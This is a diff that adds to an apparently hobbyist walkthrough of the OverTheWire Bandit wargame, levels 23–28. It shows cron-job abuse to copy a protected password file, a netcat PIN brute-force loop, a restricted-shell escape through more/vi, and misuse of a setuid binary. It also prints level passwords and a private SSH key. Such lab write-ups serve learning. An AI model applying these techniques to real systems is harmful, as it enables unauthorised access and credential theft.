@@ -1523,4 +1523,1075 @@ And ***BOOM BABY!*** We have the password for bandit23! Let's GO!
 **Username:** *bandit23*  
 **Password:** *QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G*  
   
+*This looks almost exactly like the previous 2 levels. However, if we take a look at the notes, we will see;*  
+**1) This level will require us to create our own shell-script!**  
+**2) Our script will be removed upon excutiong. So we should keep a copy of our script!**  
+  
+So, where do we begin? Let's start working our way around the server!  
+The first thing we need to do, is go ahead and move into the directory '/etc/cron.d/' and then cat out the file for bandit24. As bandti24 is our next target.  
+  
+```
+$ cd /etc/cron.d  
+  
+$ ls  
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat  
+  
+$ cat cronjob_bandit24  
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null  
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null  
+  
+$ cat /usr/bin/cronjob_bandit24.sh  
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+  
+This is a MASSIVE jump in these challenges. And now we will write our first Shell-Script. But what type of script do we need to do? And how will it work? Let's break it down and make it make sense to us all!  
+  
+So, what we are actually going to do, is write out our own bash script that is based upon the one mentioned above. However, we will need to update it to where it is working for bandit24!  
+  
+We will make a new folder and call it what ever you want. And then move into the directory, and then use nano in order to open a text editor and we will get started working on our bash script;
+```
+$ cd /tmp  
+  
+$ mkdir cryptoh4ck3r  
+  
+$ sudo nano myscriptname.sh  
+  
+```
+Okay, so the script we are going to be making will be a simple one. All we are going to do, is tell the program to read the contents inside of /etc/bandit_pass/bandit24 and then save that to a directory. 
+  
+```
+***Shell-Script To Execute***  
+  
+#!/bin/bash  
+  
+cat /etc/bandit_pass/bandit24 > /tmp/cryptoh4ck3r/password.txt
+```
+Now that we have such an easy script we can use, let's adjust some permissions and create another text file like so;  
+```
+**FIRST: Let's grant read/write/execute permissions on our file;**  
+$ chmod 777 myscriptname.sh  
+  
+**NEXT: We need to create our "password.txt" file to write too;**  
+$ touch password.txt  
+  
+**Guess what. We need to grant permission for our password file too!**  
+$ chmod 777 password.txt  
+  
+** Now, we need to copy our script over to the /var/spool/bandit24 location & execute it;  
+$ cp myscript.sh /var/spool/bandit24
+  
+** We should be getting an error now; **  
+cp: cannot create regular file '/var/spool/bandit24/myscript.sh': Operation not permitted  
+  
+** We can CD into /var/spool/bandit24 and do an ls to see what is going on;  
+  
+$ cd /var/spool/bandit24  
+  
+$ ls  
+foo  
+  
+** And we will copy our script into that folder like so;  
+$ cd /tmp/cryptoh4ck3r/  
+  
+$ cp myscript.sh /var/spool/bandit24/foo  
+```
+  
+*Now, after waiting about 1-Minute, we should be able to see the password displayed inside of our password.txt file... Like so;*  
+  
+```
+$ cat password.txt  
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  
+```
+  
+***BOOM*** It is like magic!  
+  
+  
+### Level 24;  
+**Username:** *bandit24*  
+**Password:** *VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar*  
+  
+*Okay, so now we have a new strategy to figure out. There is a daemon that is listening on port 30002, and it will give us the password for bandit25 if we give it the password for bandit24 + a secret numeric code that is 4-digits long. However, the only way to retrieve this secret code is by searching among all 10000 combinations.*  
+  
+***WHAT? WAIT? HOW?***  
+*My friends, this is called brute forcing ;)*  
+  
+Since we know that the pin code is a 4-digit code, we need to figure it out. And the first thing we can try and do is get lucky on our own. To at least initiate the ability to retrieve the code, we will need to connect on port 30002.  
+  
+```
+$ nc localhost 30002  
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.  
+  
+**Now, we need to supply the password for bandit24 + a 4 digit pin;  
+  
+$ nc localhost 30002  
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.  
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234  
+Wrong! Please enter the correct pincode. Try again.
+  
+```
+Okay, so that did not work out. And you may feel free to try this on your own using random 4-digit pin codes. And if you get it on your own, awesome! Otherwise, let's proceed.  
+  
+So what we can do is check to see if we have Python installed on this server;  
+```
+$ python  
+Command 'python' not found, did you mean:  
+  command 'python3' from deb python3  
+  command 'python' from deb python-is-python3  
+  
+**Looks like python, but python3, lets check;**  
+  
+$ python3  
+Python 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux  
+Type "help", "copyright", "credits" or "license" for more information.  
+  
+```
+  
+Alright, now that we have Python installed, what we are going to want to do is setup a simple for loop script that will allow us to "bruteforce" each of the 10000 different combinations for this 4-digit pin.   
+In order to get started, let's create a new directory inside of our /tmp location and you can call it what ever you want. Your name/alias name, etc.   
+```  
+$ mkdir /tmp/cryptoh4ck3r  
+  
+$ cd /tmp/cryptoh4ck3r  
+  
+$ nano mypython.sh  
+#!/bin/bash
+We will set a variable to call using the bandit24 password like so;  
+bandit24password=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  
+```
+  
+If you try to save and close this, and you get a read/write error, that is okay. Simply do the following commands;  
+```
+$ cd ..  
+  
+$ mkdir new_directory_name  
+  
+$ cd new_directory_name  
+  
+$ nano mypython.sh  
+  
+#!/bin/bash  
+  
+**We will set a variable to cann using the Bandit24 password like so;  
+bandit24password=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  
+  
+**Now, time to create a for loop.**  
+A for loop will keep running until the conditions are met. Let's begin!  
+  
+for i in {1111..9999}; do
+	echo "$bandit24password $i"  
+done | nc localhost 30002 
+```
+Basically, what we just did is created a python script that will allow us to call "i" between 4 digit pins and it will echo out our bandit24 password along side with a new set of 4-digit pins ranging from 1111 to 9999.  
+  
+We also added our netcat command to allow it to connect to the port we want it to connect to. This is 1 method we can use to bruteforce our way into multiple ports.  
+  
+Now, we can execute this command like so;  
+  
+```
+$ chmod 777 mypython.sh  
+  
+$ ./mypython.sh  
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.  
+Wrong! Please enter the correct pincode. Try again.  
+Wrong! Please enter the correct pincode. Try again.  
+Wrong! Please enter the correct pincode. Try again.  
+Wrong! Please enter the correct pincode. Try again.  
+Correct!  
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d  
+  
+Exiting.  
+```
+***AWESOME SAUCE!!!*** You know what this means? Our python for loop function actually worked! We know this works because we can read;  
+"The password of user bandit24 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d"  
+  
+Now, we can exit out, and connect back to the server using bandit25 as the user name and "p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d" for the password!  
+  
+  
+### Level 25;  
+**Username:** *bandit25*  
+**Password:** *p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d*  
+*Okay. So the access to bandit26 is done by bandit25. However, the shell for user bandit26 is not in /bin/bash/, but it is in something else completely. Oh boy. We need to figure out how this works and then break out of it.*  
+  
+If we where to take a quick look inside of our directory, we will see that we have an SSH Key we can use for bandit26;  
+```
+$ ls  
+bandit26.sh  
+```
+However, we know from our clues already that the shell for user bandit26 is **NOT** in the */bin/bash/* directory. So what do we need to do in order to gain access to this user? Well, let's try and see if we can log in like we did before with our other ssh key.  
+  
+``` 
+$ ssh -i bandit26.sshkey bandit26@localhost -p 2220
+The authenticity of host 'localhost (127.0.0.1)' can't be established.  
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.   
+This key is not known by any other names  
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
+  
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to localhost closed.  
+  
+```
+Well, it looks like it worked. However, the connection was closed. OH NO!  
+Remember on the last time, we had to change the connection type and where we started in at? We can try to use the same concept here;  
+```
+$ ssh -t -i bandit26.sshkey bandit26@localhost -p 2220 "/bin/bash"
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit25/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to localhost closed.
+```
+Oh dear, another connection to localhost closed down. Strange. This worked last time for us!  
+We will be using the "more" command. This is a bit like our cat command. So if we do;  
+```
+$ cat bandit26.sshkey  
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+  
+** We can also use the "moore" in order to get the same results; **  
+  
+$ more bandit26.sshkey  
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+```
+Now, if we have our terminal in a small screen and only able to see just a few inches of it, and we do "more" command, we can see that it tells us that it displays just a little bit of data and we can easily move up/down inside of the more command.  
+  
+But how does that help us? After a quick Google search, I was able to discover that "more" & "vim" are hand-in-hand. So we can shrink our terminal screen down real small, and then we can run the ssh command 1 more time and we will be able to use the VIM editor. From inside our VIM Editor we can actually set the shell directory. Just like so;
+  
+
+Now that we have shrinked our terminal screen to display a small screen, if we run the command again, we will be able to see the "--More--(83%)" information. Now we can type in "vi" in our keyboard and it will open up our VIM!
+ Now we can write out our commands from within VIM in order to tell the connection to make us connect to bandit26 on the shell acess like so;
+
+:set shell=/bin/bash  
+Now you press enter to save it.  
+Next, what you want to do is type the next line in;  
+:shell  
+And this will grant us access to bandit26!  
+  
+So where is the password? It will be written inside of the directory '/etc/bandit_pass/bandit26'. So we can easily see the password by cating it out;  
+```
+$ cat /etc/bandit_pass/bandit26  
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+```
+And **MAGIC HACKER** you did it!  
+**OR DID YOU!**  
+If you try to connect to this user using the password, you will get connection closed. Why? Because there is something else happening. Let's close the connection and get back into our connection to the server using Bandit25.  
+```
+$ ssh bandit25@13.50.114.40 -p 2220
+```
+Now, let's take a look at the tip saying that bandit26 is not using the standard bin/bash setup. So what we need to do is cat the /etc/passwd in order to see what is going on.  
+```
+$ cat /etc/passwd  
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
+_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
+bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
+bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
+bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
+bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
+bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
+bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
+bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
+bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash
+bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash
+bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash
+bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash
+bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash
+bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash
+bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash
+bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
+bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
+bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
+bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
+bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash
+bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
+bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash
+bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash
+bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
+bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash
+bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
+bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
+bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
+bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash
+bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash
+bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash
+bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell
+bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell
+bandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shell
+bandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shell
+bandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell
+krypton1:x:8001:8001:krypton level 1:/home/krypton1:/bin/bash
+krypton2:x:8002:8002:krypton level 2:/home/krypton2:/bin/bash
+krypton3:x:8003:8003:krypton level 3:/home/krypton3:/bin/bash
+krypton4:x:8004:8004:krypton level 4:/home/krypton4:/bin/bash
+krypton5:x:8005:8005:krypton level 5:/home/krypton5:/bin/bash
+krypton6:x:8006:8006:krypton level 6:/home/krypton6:/bin/bash
+krypton7:x:8007:8007:krypton level 7:/home/krypton7:/bin/bash
+```
+And everything looks almost the exact same. Except for bandit26. This is pointing to '/usr/bin/showtext'. Well, you know what we need to do! Let's cat that directory and see what we have;
+```
+$ cat /usr/bin/showtext  
+#!/bin/sh  
+  
+export TERM=linux  
+  
+exec more ~/text.txt  
+exit 0  
+  
+```
+We can see that it changes the terminal and changing it to the more setup instead of the standard structure. And now we also see that it has an exit technique as well. And this is why we are able to change the shell when we try to connect to the bandit26 when we run shell in VIM.  
+
+  
+### Level 26;  
+**Username:** *bandit26*  
+**Password:** *c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1*  
+  
+*In order to gain access to level 27, let's connect back to bandit26 using the VIM technique we just learned about!*  
+  
+Now, what we want to do is...get the password for Level 27 (aka bandit27)!  
+If we take a look inside our directory on bandit26, we can see;  
+```
+$ ls  
+bandit27-do text.txt  
+```
+We all know by now that this "-do" file will be an executable. But we can confirm by using the "file" command like so;  
+```
+$ file bandit27-do  
+bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped  
+```
+So we can execute this command and see what it does but we are going to cat the password for bandit27 from the /etc/bandit_pass directory. Like so;  
+```
+$ ./bandit27-do cat /etc/bandit_pass/bandit27  
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS  
+```
+And now we have the password to bandit27, and all we had to do was execute their own code, and then use it to cat out the file from the directory!  
+  
+But, let us test this out shall we!  
+Disconnect from the server, and then try to connect back to the server with "bandit27" and see if we get any errors;  
+```
+$ ssh bandit27@13.50.114.40 -p 2220  
+```
+And if we provide the password we just obtained from our last command, we should have access to the server using bandit27!  
+  
+
+### Level 27;  
+**Username:** *bandit27*  
+**Passwword:** *YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS*  
+*Oh boy!* Looks like we get to use some Git commands to get the next password. According to our site, we need to look at the git repository and use the password for bandit27-git which should be the same for the user bandit27. We need to clone and get the repo in order to find the password for the next level!  
+  
+To start this off, we must get a clone of this project. But if we try to clone it right now, we get permission denied. So we need to find our way back into the /tmp/ directory and create a new folder in there for us to use. Then we will clone the project;  
+  
+```
+$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo  
+-bash: cd: /home/bandit27-git/repor: Permission denied  
+  
+$ cd /tmp/  
+  
+$ mkdir /cryptoh4ck3r  
+  
+$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo  
+Cloning into 'repo'...
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit27/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit27-git@localhost's password: 
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (2/2), done.
+Receiving objects: 100% (3/3), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+```
+And now we have access to the git repo. Now all we have to do is look at what files that we have and read from them so we can find the password;  
+```
+$ ls  
+README  
+  
+$ cat README  
+The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
+  
+```
+Presto Magic Boom Baby! Now we have the password to the next level!  
+  
+### Level 28;  
+**Username:** *bandit28*  
+**Password:** *AVanL161y9rsbcJIsFHuw35rjaOM19nR*  
+  
+*According to the notes on Over the Wire, it looks like this is the exact same setup as with bandit27. So, let's create our folder inside of /tmp and clone the git repo into that folder and take a look around.  
+  
+```
+$ mkdir /tmp/cryptoh4ck3r  
+  
+$ cd /tmp/cryptoh4ck3r  
+  
+$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo  
+  
+Cloning into 'repo'...
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit28/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit28-git@localhost's password: 
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (9/9), done.
+Resolving deltas: 100% (2/2), done.
+  
+$ ls  
+repo  
+  
+$ cd repo  
+  
+$ ls  
+README.md  
+  
+$ cat README.md  
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+```
+Well. That actually sucks. It appears that the password is all x's. And we are almost 100% positive that that will not be the password we seek. So what do we need to do? We need to find the previous versions of this file to see if they have had the original password in there. We can do that like so;  
+```
+**Check the Branches;**   
+$ git branch -r  
+  origin/HEAD -> origin/master  
+  origin/master  
+  
+**To see the current working branch we are working on;**  
+$ git branch  
+* master  
+  
+**If we want to check for any Tags;**  
+$ git tag  
+  
+**If we want to look at the logs of the branch;**  
+$ git log  
+commit 5f45cfaca938393c7706fec16ab1ca627e947f64 (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Sat Dec 3 08:14:06 2022 +0000
+
+    fix info leak
+
+commit f08ee321c5f564b2da90789fac14b5ae2e55c56c
+Author: Morla Porla <morla@overthewire.org>
+Date:   Sat Dec 3 08:14:06 2022 +0000
+
+    add missing data
+
